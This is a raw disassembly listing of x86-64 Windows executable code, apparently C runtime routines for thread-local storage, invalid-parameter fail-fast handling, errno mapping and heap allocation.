   14000795c:	ff 15 3e 87 00 00    	call   *0x873e(%rip)        # 0x1400100a0
   140007962:	48 8b c7             	mov    %rdi,%rax
   140007965:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000796a:	48 83 c4 30          	add    $0x30,%rsp
   14000796e:	5f                   	pop    %rdi
   14000796f:	c3                   	ret
   140007970:	40 57                	rex push %rdi
   140007972:	48 83 ec 30          	sub    $0x30,%rsp
   140007976:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   14000797d:	ff ff 
   14000797f:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140007984:	48 8b fa             	mov    %rdx,%rdi
   140007987:	33 db                	xor    %ebx,%ebx
   140007989:	8b 0d 01 67 01 00    	mov    0x16701(%rip),%ecx        # 0x14001e090
   14000798f:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140007992:	75 04                	jne    0x140007998
   140007994:	8b c3                	mov    %ebx,%eax
   140007996:	eb 06                	jmp    0x14000799e
   140007998:	e8 df 34 00 00       	call   0x14000ae7c
   14000799d:	90                   	nop
   14000799e:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400079a2:	74 19                	je     0x1400079bd
   1400079a4:	48 85 c0             	test   %rax,%rax
   1400079a7:	75 0a                	jne    0x1400079b3
   1400079a9:	e8 b2 fd ff ff       	call   0x140007760
   1400079ae:	48 85 c0             	test   %rax,%rax
   1400079b1:	74 0a                	je     0x1400079bd
   1400079b3:	48 69 df c8 03 00 00 	imul   $0x3c8,%rdi,%rbx
   1400079ba:	48 03 d8             	add    %rax,%rbx
   1400079bd:	48 8b c3             	mov    %rbx,%rax
   1400079c0:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400079c5:	48 83 c4 30          	add    $0x30,%rsp
   1400079c9:	5f                   	pop    %rdi
   1400079ca:	c3                   	ret
   1400079cb:	cc                   	int3
   1400079cc:	48 83 ec 28          	sub    $0x28,%rsp
   1400079d0:	e8 53 36 00 00       	call   0x14000b028
   1400079d5:	48 8d 0d 6c fc ff ff 	lea    -0x394(%rip),%rcx        # 0x140007648
   1400079dc:	88 05 c6 74 01 00    	mov    %al,0x174c6(%rip)        # 0x14001eea8
   1400079e2:	e8 85 34 00 00       	call   0x14000ae6c
   1400079e7:	89 05 a3 66 01 00    	mov    %eax,0x166a3(%rip)        # 0x14001e090
   1400079ed:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400079f0:	75 04                	jne    0x1400079f6
   1400079f2:	32 c0                	xor    %al,%al
   1400079f4:	eb 15                	jmp    0x140007a0b
   1400079f6:	e8 e5 fe ff ff       	call   0x1400078e0
   1400079fb:	48 85 c0             	test   %rax,%rax
   1400079fe:	75 09                	jne    0x140007a09
   140007a00:	33 c9                	xor    %ecx,%ecx
   140007a02:	e8 09 00 00 00       	call   0x140007a10
   140007a07:	eb e9                	jmp    0x1400079f2
   140007a09:	b0 01                	mov    $0x1,%al
   140007a0b:	48 83 c4 28          	add    $0x28,%rsp
   140007a0f:	c3                   	ret
   140007a10:	48 83 ec 28          	sub    $0x28,%rsp
   140007a14:	8b 0d 76 66 01 00    	mov    0x16676(%rip),%ecx        # 0x14001e090
   140007a1a:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140007a1d:	74 0c                	je     0x140007a2b
   140007a1f:	e8 50 34 00 00       	call   0x14000ae74
   140007a24:	83 0d 65 66 01 00 ff 	orl    $0xffffffff,0x16665(%rip)        # 0x14001e090
   140007a2b:	b0 01                	mov    $0x1,%al
   140007a2d:	48 83 c4 28          	add    $0x28,%rsp
   140007a31:	c3                   	ret
   140007a32:	cc                   	int3
   140007a33:	cc                   	int3
   140007a34:	cc                   	int3
   140007a35:	cc                   	int3
   140007a36:	cc                   	int3
   140007a37:	cc                   	int3
   140007a38:	cc                   	int3
   140007a39:	cc                   	int3
   140007a3a:	cc                   	int3
   140007a3b:	cc                   	int3
   140007a3c:	cc                   	int3
   140007a3d:	cc                   	int3
   140007a3e:	cc                   	int3
   140007a3f:	cc                   	int3
   140007a40:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007a45:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007a4a:	57                   	push   %rdi
   140007a4b:	48 83 ec 20          	sub    $0x20,%rsp
   140007a4f:	48 8b 31             	mov    (%rcx),%rsi
   140007a52:	33 ff                	xor    %edi,%edi
   140007a54:	48 8b d9             	mov    %rcx,%rbx
   140007a57:	48 85 f6             	test   %rsi,%rsi
   140007a5a:	75 3b                	jne    0x140007a97
   140007a5c:	ff 15 36 86 00 00    	call   *0x8636(%rip)        # 0x140010098
   140007a62:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140007a66:	40 38 7b 10          	cmp    %dil,0x10(%rbx)
   140007a6a:	75 0a                	jne    0x140007a76
   140007a6c:	48 89 7b 08          	mov    %rdi,0x8(%rbx)
   140007a70:	c6 43 10 01          	movb   $0x1,0x10(%rbx)
   140007a74:	eb 04                	jmp    0x140007a7a
   140007a76:	48 8b 7b 08          	mov    0x8(%rbx),%rdi
   140007a7a:	48 8b d7             	mov    %rdi,%rdx
   140007a7d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007a82:	e8 e9 fe ff ff       	call   0x140007970
   140007a87:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140007a8b:	48 8b f0             	mov    %rax,%rsi
   140007a8e:	48 89 03             	mov    %rax,(%rbx)
   140007a91:	ff 15 09 86 00 00    	call   *0x8609(%rip)        # 0x1400100a0
   140007a97:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140007a9c:	48 8b c6             	mov    %rsi,%rax
   140007a9f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007aa4:	48 83 c4 20          	add    $0x20,%rsp
   140007aa8:	5f                   	pop    %rdi
   140007aa9:	c3                   	ret
   140007aaa:	cc                   	int3
   140007aab:	cc                   	int3
   140007aac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007ab1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007ab6:	57                   	push   %rdi
   140007ab7:	48 83 ec 20          	sub    $0x20,%rsp
   140007abb:	33 db                	xor    %ebx,%ebx
   140007abd:	48 8b fa             	mov    %rdx,%rdi
   140007ac0:	48 8b f1             	mov    %rcx,%rsi
   140007ac3:	38 5a 10             	cmp    %bl,0x10(%rdx)
   140007ac6:	75 18                	jne    0x140007ae0
   140007ac8:	ff 15 ca 85 00 00    	call   *0x85ca(%rip)        # 0x140010098
   140007ace:	8b c8                	mov    %eax,%ecx
   140007ad0:	48 89 5f 08          	mov    %rbx,0x8(%rdi)
   140007ad4:	c6 47 10 01          	movb   $0x1,0x10(%rdi)
   140007ad8:	ff 15 c2 85 00 00    	call   *0x85c2(%rip)        # 0x1400100a0
   140007ade:	eb 04                	jmp    0x140007ae4
   140007ae0:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   140007ae4:	48 8d 04 de          	lea    (%rsi,%rbx,8),%rax
   140007ae8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007aed:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007af2:	48 83 c4 20          	add    $0x20,%rsp
   140007af6:	5f                   	pop    %rdi
   140007af7:	c3                   	ret
   140007af8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007afd:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007b02:	55                   	push   %rbp
   140007b03:	57                   	push   %rdi
   140007b04:	41 56                	push   %r14
   140007b06:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   140007b0d:	ff 
   140007b0e:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   140007b15:	48 8b 05 e4 64 01 00 	mov    0x164e4(%rip),%rax        # 0x14001e000
   140007b1c:	48 33 c4             	xor    %rsp,%rax
   140007b1f:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   140007b26:	41 8b f8             	mov    %r8d,%edi
   140007b29:	8b f2                	mov    %edx,%esi
   140007b2b:	8b d9                	mov    %ecx,%ebx
   140007b2d:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140007b30:	74 05                	je     0x140007b37
   140007b32:	e8 c5 bb ff ff       	call   0x1400036fc
   140007b37:	33 d2                	xor    %edx,%edx
   140007b39:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140007b3e:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140007b44:	e8 b7 75 00 00       	call   0x14000f100
   140007b49:	33 d2                	xor    %edx,%edx
   140007b4b:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140007b4f:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140007b55:	e8 a6 75 00 00       	call   0x14000f100
   140007b5a:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   140007b60:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140007b65:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140007b6b:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140007b6f:	48 83 64 24 50 00    	andq   $0x0,0x50(%rsp)
   140007b75:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140007b7a:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140007b7e:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140007b83:	ff 15 c7 85 00 00    	call   *0x85c7(%rip)        # 0x140010150
   140007b89:	4c 8b b5 08 01 00 00 	mov    0x108(%rbp),%r14
   140007b90:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140007b95:	49 8b ce             	mov    %r14,%rcx
   140007b98:	45 33 c0             	xor    %r8d,%r8d
   140007b9b:	ff 15 47 85 00 00    	call   *0x8547(%rip)        # 0x1400100e8
   140007ba1:	48 85 c0             	test   %rax,%rax
   140007ba4:	74 36                	je     0x140007bdc
   140007ba6:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140007bac:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140007bb1:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140007bb6:	4c 8b c8             	mov    %rax,%r9
   140007bb9:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140007bbe:	4d 8b c6             	mov    %r14,%r8
   140007bc1:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140007bc6:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140007bcb:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140007bcf:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140007bd4:	33 c9                	xor    %ecx,%ecx
   140007bd6:	ff 15 7c 85 00 00    	call   *0x857c(%rip)        # 0x140010158
   140007bdc:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140007be3:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   140007bea:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   140007bf1:	48 83 c0 08          	add    $0x8,%rax
   140007bf5:	89 74 24 70          	mov    %esi,0x70(%rsp)
   140007bf9:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   140007c00:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140007c07:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   140007c0b:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   140007c0f:	ff 15 4b 85 00 00    	call   *0x854b(%rip)        # 0x140010160
   140007c15:	33 c9                	xor    %ecx,%ecx
   140007c17:	8b f8                	mov    %eax,%edi
   140007c19:	ff 15 59 84 00 00    	call   *0x8459(%rip)        # 0x140010078
   140007c1f:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140007c24:	ff 15 3e 85 00 00    	call   *0x853e(%rip)        # 0x140010168
   140007c2a:	85 c0                	test   %eax,%eax
   140007c2c:	75 10                	jne    0x140007c3e
   140007c2e:	85 ff                	test   %edi,%edi
   140007c30:	75 0c                	jne    0x140007c3e
   140007c32:	83 fb ff             	cmp    $0xffffffff,%ebx
   140007c35:	74 07                	je     0x140007c3e
   140007c37:	8b cb                	mov    %ebx,%ecx
   140007c39:	e8 be ba ff ff       	call   0x1400036fc
   140007c3e:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   140007c45:	48 33 cc             	xor    %rsp,%rcx
   140007c48:	e8 c3 b4 ff ff       	call   0x140003110
   140007c4d:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   140007c54:	00 
   140007c55:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140007c59:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140007c5d:	49 8b e3             	mov    %r11,%rsp
   140007c60:	41 5e                	pop    %r14
   140007c62:	5f                   	pop    %rdi
   140007c63:	5d                   	pop    %rbp
   140007c64:	c3                   	ret
   140007c65:	cc                   	int3
   140007c66:	cc                   	int3
   140007c67:	cc                   	int3
   140007c68:	48 89 0d 41 72 01 00 	mov    %rcx,0x17241(%rip)        # 0x14001eeb0
   140007c6f:	c3                   	ret
   140007c70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007c75:	55                   	push   %rbp
   140007c76:	48 8b ec             	mov    %rsp,%rbp
   140007c79:	48 83 ec 70          	sub    $0x70,%rsp
   140007c7d:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   140007c82:	83 3d e3 71 01 00 00 	cmpl   $0x0,0x171e3(%rip)        # 0x14001ee6c
   140007c89:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   140007c8d:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   140007c91:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   140007c95:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   140007c99:	75 10                	jne    0x140007cab
   140007c9b:	0f 10 05 a6 6a 01 00 	movups 0x16aa6(%rip),%xmm0        # 0x14001e748
   140007ca2:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   140007ca6:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   140007cab:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140007caf:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007cb4:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140007cb8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007cbd:	e8 4a 00 00 00       	call   0x140007d0c
   140007cc2:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   140007cc6:	75 0b                	jne    0x140007cd3
   140007cc8:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   140007ccc:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140007cd3:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   140007cd7:	74 0f                	je     0x140007ce8
   140007cd9:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   140007cdc:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140007ce0:	e8 7b f6 ff ff       	call   0x140007360
   140007ce5:	89 58 20             	mov    %ebx,0x20(%rax)
   140007ce8:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   140007cec:	74 0f                	je     0x140007cfd
   140007cee:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   140007cf1:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140007cf5:	e8 66 f6 ff ff       	call   0x140007360
   140007cfa:	89 58 24             	mov    %ebx,0x24(%rax)
   140007cfd:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140007d04:	00 
   140007d05:	48 83 c4 70          	add    $0x70,%rsp
   140007d09:	5d                   	pop    %rbp
   140007d0a:	c3                   	ret
   140007d0b:	cc                   	int3
   140007d0c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007d11:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007d16:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007d1b:	57                   	push   %rdi
   140007d1c:	48 83 ec 30          	sub    $0x30,%rsp
   140007d20:	48 8b e9             	mov    %rcx,%rbp
   140007d23:	41 8b d9             	mov    %r9d,%ebx
   140007d26:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140007d2b:	49 8b f8             	mov    %r8,%rdi
   140007d2e:	48 8b f2             	mov    %rdx,%rsi
   140007d31:	e8 0a fd ff ff       	call   0x140007a40
   140007d36:	48 85 c0             	test   %rax,%rax
   140007d39:	74 3c                	je     0x140007d77
   140007d3b:	48 8b 80 b8 03 00 00 	mov    0x3b8(%rax),%rax
   140007d42:	48 85 c0             	test   %rax,%rax
   140007d45:	74 30                	je     0x140007d77
   140007d47:	44 8b cb             	mov    %ebx,%r9d
   140007d4a:	4c 8b c7             	mov    %rdi,%r8
   140007d4d:	48 8b d6             	mov    %rsi,%rdx
   140007d50:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140007d55:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140007d5a:	48 8b cd             	mov    %rbp,%rcx
   140007d5d:	e8 ae 6c 00 00       	call   0x14000ea10
   140007d62:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140007d67:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140007d6c:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140007d71:	48 83 c4 30          	add    $0x30,%rsp
   140007d75:	5f                   	pop    %rdi
   140007d76:	c3                   	ret
   140007d77:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   140007d7c:	48 8d 0d 2d 71 01 00 	lea    0x1712d(%rip),%rcx        # 0x14001eeb0
   140007d83:	e8 24 fd ff ff       	call   0x140007aac
   140007d88:	44 8b cb             	mov    %ebx,%r9d
   140007d8b:	4c 8b c7             	mov    %rdi,%r8
   140007d8e:	48 8b d6             	mov    %rsi,%rdx
   140007d91:	4c 8b 10             	mov    (%rax),%r10
   140007d94:	48 8b 05 65 62 01 00 	mov    0x16265(%rip),%rax        # 0x14001e000
   140007d9b:	4c 33 d0             	xor    %rax,%r10
   140007d9e:	8b c8                	mov    %eax,%ecx
   140007da0:	83 e1 3f             	and    $0x3f,%ecx
   140007da3:	49 d3 ca             	ror    %cl,%r10
   140007da6:	4d 85 d2             	test   %r10,%r10
   140007da9:	74 05                	je     0x140007db0
   140007dab:	49 8b c2             	mov    %r10,%rax
   140007dae:	eb a0                	jmp    0x140007d50
   140007db0:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140007db5:	48 8b cd             	mov    %rbp,%rcx
   140007db8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007dbd:	e8 22 00 00 00       	call   0x140007de4
   140007dc2:	cc                   	int3
   140007dc3:	cc                   	int3
   140007dc4:	48 83 ec 38          	sub    $0x38,%rsp
   140007dc8:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140007dce:	45 33 c9             	xor    %r9d,%r9d
   140007dd1:	45 33 c0             	xor    %r8d,%r8d
   140007dd4:	33 d2                	xor    %edx,%edx
   140007dd6:	33 c9                	xor    %ecx,%ecx
   140007dd8:	e8 93 fe ff ff       	call   0x140007c70
   140007ddd:	48 83 c4 38          	add    $0x38,%rsp
   140007de1:	c3                   	ret
   140007de2:	cc                   	int3
   140007de3:	cc                   	int3
   140007de4:	48 83 ec 28          	sub    $0x28,%rsp
   140007de8:	b9 17 00 00 00       	mov    $0x17,%ecx
   140007ded:	ff 15 55 83 00 00    	call   *0x8355(%rip)        # 0x140010148
   140007df3:	85 c0                	test   %eax,%eax
   140007df5:	74 07                	je     0x140007dfe
   140007df7:	b9 05 00 00 00       	mov    $0x5,%ecx
   140007dfc:	cd 29                	int    $0x29
   140007dfe:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140007e04:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140007e09:	41 8d 48 01          	lea    0x1(%r8),%ecx
   140007e0d:	e8 e6 fc ff ff       	call   0x140007af8
   140007e12:	ff 15 08 83 00 00    	call   *0x8308(%rip)        # 0x140010120
   140007e18:	48 8b c8             	mov    %rax,%rcx
   140007e1b:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140007e20:	48 83 c4 28          	add    $0x28,%rsp
   140007e24:	48 ff 25 05 83 00 00 	rex.W jmp *0x8305(%rip)        # 0x140010130
   140007e2b:	cc                   	int3
   140007e2c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007e31:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007e36:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140007e3b:	8b d1                	mov    %ecx,%edx
   140007e3d:	83 f9 01             	cmp    $0x1,%ecx
   140007e40:	72 6d                	jb     0x140007eaf
   140007e42:	83 f9 0d             	cmp    $0xd,%ecx
   140007e45:	77 14                	ja     0x140007e5b
   140007e47:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140007e4a:	4c 8d 0d 2f a1 00 00 	lea    0xa12f(%rip),%r9        # 0x140011f80
   140007e51:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   140007e56:	e9 90 00 00 00       	jmp    0x140007eeb
   140007e5b:	81 fa 18 07 00 00    	cmp    $0x718,%edx
   140007e61:	77 4c                	ja     0x140007eaf
   140007e63:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   140007e68:	4c 8d 0d 11 a1 00 00 	lea    0xa111(%rip),%r9        # 0x140011f80
   140007e6f:	33 f6                	xor    %esi,%esi
   140007e71:	44 8b d6             	mov    %esi,%r10d
   140007e74:	8d 79 ff             	lea    -0x1(%rcx),%edi
   140007e77:	4c 8b c1             	mov    %rcx,%r8
   140007e7a:	49 d1 e8             	shr    $1,%r8
   140007e7d:	74 3f                	je     0x140007ebe
   140007e7f:	f6 c1 01             	test   $0x1,%cl
   140007e82:	49 8d 48 ff          	lea    -0x1(%r8),%rcx
   140007e86:	49 0f 45 c8          	cmovne %r8,%rcx
   140007e8a:	4e 8d 1c 11          	lea    (%rcx,%r10,1),%r11
   140007e8e:	4b 8d 04 d9          	lea    (%r9,%r11,8),%rax
   140007e92:	3b 10                	cmp    (%rax),%edx
   140007e94:	74 37                	je     0x140007ecd
   140007e96:	72 07                	jb     0x140007e9f
   140007e98:	4d 8d 53 01          	lea    0x1(%r11),%r10
   140007e9c:	49 8b c8             	mov    %r8,%rcx
   140007e9f:	49 8d 43 ff          	lea    -0x1(%r11),%rax
   140007ea3:	48 0f 43 c7          	cmovae %rdi,%rax
   140007ea7:	48 8b f8             	mov    %rax,%rdi
   140007eaa:	4c 3b d0             	cmp    %rax,%r10
   140007ead:	76 c8                	jbe    0x140007e77
   140007eaf:	8d 4a ed             	lea    -0x13(%rdx),%ecx
   140007eb2:	83 f9 11             	cmp    $0x11,%ecx
   140007eb5:	77 20                	ja     0x140007ed7
   140007eb7:	b8 0d 00 00 00       	mov    $0xd,%eax
   140007ebc:	eb 2d                	jmp    0x140007eeb
   140007ebe:	48 85 c9             	test   %rcx,%rcx
   140007ec1:	74 ec                	je     0x140007eaf
   140007ec3:	4b 8d 04 d1          	lea    (%r9,%r10,8),%rax
   140007ec7:	3b 10                	cmp    (%rax),%edx
   140007ec9:	48 0f 45 c6          	cmovne %rsi,%rax
   140007ecd:	48 85 c0             	test   %rax,%rax
   140007ed0:	74 dd                	je     0x140007eaf
   140007ed2:	8b 40 04             	mov    0x4(%rax),%eax
   140007ed5:	eb 14                	jmp    0x140007eeb
   140007ed7:	b8 16 00 00 00       	mov    $0x16,%eax
   140007edc:	8d 8a 44 ff ff ff    	lea    -0xbc(%rdx),%ecx
   140007ee2:	83 f9 0e             	cmp    $0xe,%ecx
   140007ee5:	8d 50 f2             	lea    -0xe(%rax),%edx
   140007ee8:	0f 46 c2             	cmovbe %edx,%eax
   140007eeb:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140007ef0:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   140007ef5:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   140007efa:	c3                   	ret
   140007efb:	cc                   	int3
   140007efc:	40 53                	rex push %rbx
   140007efe:	48 83 ec 20          	sub    $0x20,%rsp
   140007f02:	8b d9                	mov    %ecx,%ebx
   140007f04:	e8 3f 00 00 00       	call   0x140007f48
   140007f09:	8b cb                	mov    %ebx,%ecx
   140007f0b:	89 18                	mov    %ebx,(%rax)
   140007f0d:	e8 1a ff ff ff       	call   0x140007e2c
   140007f12:	8b d8                	mov    %eax,%ebx
   140007f14:	e8 53 00 00 00       	call   0x140007f6c
   140007f19:	89 18                	mov    %ebx,(%rax)
   140007f1b:	48 83 c4 20          	add    $0x20,%rsp
   140007f1f:	5b                   	pop    %rbx
   140007f20:	c3                   	ret
   140007f21:	cc                   	int3
   140007f22:	cc                   	int3
   140007f23:	cc                   	int3
   140007f24:	40 53                	rex push %rbx
   140007f26:	48 83 ec 20          	sub    $0x20,%rsp
   140007f2a:	48 8b da             	mov    %rdx,%rbx
   140007f2d:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   140007f31:	89 4a 34             	mov    %ecx,0x34(%rdx)
   140007f34:	e8 f3 fe ff ff       	call   0x140007e2c
   140007f39:	89 43 2c             	mov    %eax,0x2c(%rbx)
   140007f3c:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   140007f40:	48 83 c4 20          	add    $0x20,%rsp
   140007f44:	5b                   	pop    %rbx
   140007f45:	c3                   	ret
   140007f46:	cc                   	int3
   140007f47:	cc                   	int3
   140007f48:	48 83 ec 28          	sub    $0x28,%rsp
   140007f4c:	e8 8f f9 ff ff       	call   0x1400078e0
   140007f51:	48 8b c8             	mov    %rax,%rcx
   140007f54:	48 8d 15 49 61 01 00 	lea    0x16149(%rip),%rdx        # 0x14001e0a4
   140007f5b:	48 83 c0 24          	add    $0x24,%rax
   140007f5f:	48 85 c9             	test   %rcx,%rcx
   140007f62:	48 0f 44 c2          	cmove  %rdx,%rax
   140007f66:	48 83 c4 28          	add    $0x28,%rsp
   140007f6a:	c3                   	ret
   140007f6b:	cc                   	int3
   140007f6c:	48 83 ec 28          	sub    $0x28,%rsp
   140007f70:	e8 6b f9 ff ff       	call   0x1400078e0
   140007f75:	48 8b c8             	mov    %rax,%rcx
   140007f78:	48 8d 15 21 61 01 00 	lea    0x16121(%rip),%rdx        # 0x14001e0a0
   140007f7f:	48 83 c0 20          	add    $0x20,%rax
   140007f83:	48 85 c9             	test   %rcx,%rcx
   140007f86:	48 0f 44 c2          	cmove  %rdx,%rax
   140007f8a:	48 83 c4 28          	add    $0x28,%rsp
   140007f8e:	c3                   	ret
   140007f8f:	cc                   	int3
   140007f90:	40 53                	rex push %rbx
   140007f92:	48 83 ec 20          	sub    $0x20,%rsp
   140007f96:	4c 8b c2             	mov    %rdx,%r8
   140007f99:	48 8b d9             	mov    %rcx,%rbx
   140007f9c:	48 85 c9             	test   %rcx,%rcx
   140007f9f:	74 0e                	je     0x140007faf
   140007fa1:	33 d2                	xor    %edx,%edx
   140007fa3:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   140007fa7:	48 f7 f3             	div    %rbx
   140007faa:	49 3b c0             	cmp    %r8,%rax
   140007fad:	72 43                	jb     0x140007ff2
   140007faf:	49 0f af d8          	imul   %r8,%rbx
   140007fb3:	b8 01 00 00 00       	mov    $0x1,%eax
   140007fb8:	48 85 db             	test   %rbx,%rbx
   140007fbb:	48 0f 44 d8          	cmove  %rax,%rbx
   140007fbf:	eb 15                	jmp    0x140007fd6
   140007fc1:	e8 aa ec ff ff       	call   0x140006c70
   140007fc6:	85 c0                	test   %eax,%eax
   140007fc8:	74 28                	je     0x140007ff2
   140007fca:	48 8b cb             	mov    %rbx,%rcx
   140007fcd:	e8 be 32 00 00       	call   0x14000b290
   140007fd2:	85 c0                	test   %eax,%eax
   140007fd4:	74 1c                	je     0x140007ff2
   140007fd6:	48 8b 0d 63 76 01 00 	mov    0x17663(%rip),%rcx        # 0x14001f640
   140007fdd:	4c 8b c3             	mov    %rbx,%r8
   140007fe0:	ba 08 00 00 00       	mov    $0x8,%edx
   140007fe5:	ff 15 85 81 00 00    	call   *0x8185(%rip)        # 0x140010170
   140007feb:	48 85 c0             	test   %rax,%rax
   140007fee:	74 d1                	je     0x140007fc1
   140007ff0:	eb 0d                	jmp    0x140007fff
   140007ff2:	e8 75 ff ff ff       	call   0x140007f6c
   140007ff7:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140007ffd:	33 c0                	xor    %eax,%eax
   140007fff:	48 83 c4 20          	add    $0x20,%rsp
   140008003:	5b                   	pop    %rbx
   140008004:	c3                   	ret
   140008005:	cc                   	int3
   140008006:	cc                   	int3
   140008007:	cc                   	int3
   140008008:	cc                   	int3
   140008009:	cc                   	int3
   14000800a:	cc                   	int3
   14000800b:	cc                   	int3
   14000800c:	cc                   	int3
   14000800d:	cc                   	int3
   14000800e:	cc                   	int3
   14000800f:	cc                   	int3
   140008010:	48 85 c9             	test   %rcx,%rcx
   140008013:	74 36                	je     0x14000804b
   140008015:	53                   	push   %rbx
   140008016:	48 83 ec 20          	sub    $0x20,%rsp
   14000801a:	4c 8b c1             	mov    %rcx,%r8
   14000801d:	33 d2                	xor    %edx,%edx
   14000801f:	48 8b 0d 1a 76 01 00 	mov    0x1761a(%rip),%rcx        # 0x14001f640
   140008026:	ff 15 4c 81 00 00    	call   *0x814c(%rip)        # 0x140010178
   14000802c:	85 c0                	test   %eax,%eax
   14000802e:	75 16                	jne    0x140008046
   140008030:	ff 15 62 80 00 00    	call   *0x8062(%rip)        # 0x140010098
